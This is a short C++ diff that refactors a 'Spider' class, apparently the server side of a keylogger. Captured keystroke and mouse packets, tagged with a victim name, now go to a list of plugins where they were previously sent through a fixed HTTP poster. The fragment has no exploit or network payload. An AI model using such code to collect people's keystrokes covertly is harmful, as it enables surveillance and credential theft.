@@ -11,11 +11,12 @@
 #include "Spider.hh"
 #include "Web.hh"
 
-Spider::Spider(const boost::shared_ptr<ISocketEngine> &socket, Web &web)
+Spider::Spider(const boost::shared_ptr<ISocketEngine> &socket, Web &web, std::list<boost::shared_ptr<IPlugin>> &listPlugins)
   : _socket(socket),
     _web(web),
     _dumpFile(new DumpFile()),
-    _httpPost(new HttpPost())
+    _listPlugins(listPlugins)
+    // _httpPost(new HttpPost())
 {
   DEBUG_MSG("Spider created");
   _socket->handleError([this](){dieInDignity();});
@@ -199,8 +200,9 @@ void			Spider::getKeystrokes(boost::asio::yield_context &yield)
   try {
     if (_dumpFile)
       _dumpFile->writePaquet(&paquet);
-    if (_httpPost)
-      _httpPost->postPaquet(&paquet, _name);
+    for (auto plugin : _listPlugins) {
+      plugin->getKey(&paquet, _name);
+    }
   }
   catch (const std::exception &e) {
     std::cerr << e.what() << std::endl;
@@ -250,8 +252,9 @@ void			Spider::getMouse(boost::asio::yield_context &yield)
 #endif // !DEBUG
 
   try {
-    if (_httpPost)
-      _httpPost->postPaquet(&paquet, _name);
+    for (auto plugin : _listPlugins) {
+      plugin->getMouse(&paquet, _name);
+    }
   }
   catch (const std::exception &e) {
     std::cerr << e.what() << std::endl;
